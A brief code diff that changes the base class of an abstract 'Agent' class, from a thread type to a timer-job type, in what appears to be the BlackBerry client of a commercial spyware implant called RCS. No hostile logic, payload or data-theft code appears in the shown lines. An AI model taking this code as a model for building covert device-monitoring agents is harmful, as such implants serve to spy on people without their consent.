@@ -10,11 +10,11 @@ package com.ht.rcs.blackberry.agent;
 import com.ht.rcs.blackberry.Status;
 import com.ht.rcs.blackberry.log.Log;
 import com.ht.rcs.blackberry.log.LogCollector;
+import com.ht.rcs.blackberry.threadpool.TimerJob;
 import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
-import com.ht.rcs.blackberry.utils.StartStopThread;
 
-public abstract class Agent extends StartStopThread {
+public abstract class Agent extends TimerJob {
 	//#debug
     private static Debug debug = new Debug("Agent", DebugLevel.VERBOSE);
 
@@ -153,4 +153,6 @@ public abstract class Agent extends StartStopThread {
         return "Agent " + name + "|" + agentId;
 
     }
+
+  
 }
